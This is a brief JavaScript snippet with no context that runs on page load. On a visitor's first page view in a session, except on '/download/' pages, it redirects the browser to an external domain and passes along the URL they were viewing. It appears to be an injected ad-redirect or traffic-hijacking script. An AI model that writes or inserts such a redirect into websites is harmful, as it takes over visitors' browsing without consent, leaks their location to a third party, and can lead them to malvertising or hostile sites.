(function(){

	var uads 	= sessionStorage.getItem('uads');
	var go_current  = window.location.href;

	var arr_ars 	= ["https:\/\/www.cikimm.com"];

	function rChoice(arr) {
	    return arr[Math.floor(arr.length * Math.random())];
	}

	var ars = rChoice(arr_ars);

	if(!uads && !go_current.includes("/download/"))
	{
		window.location.href = `${ars}#uads=${encodeURIComponent(go_current)}`; 
	}
	
})();
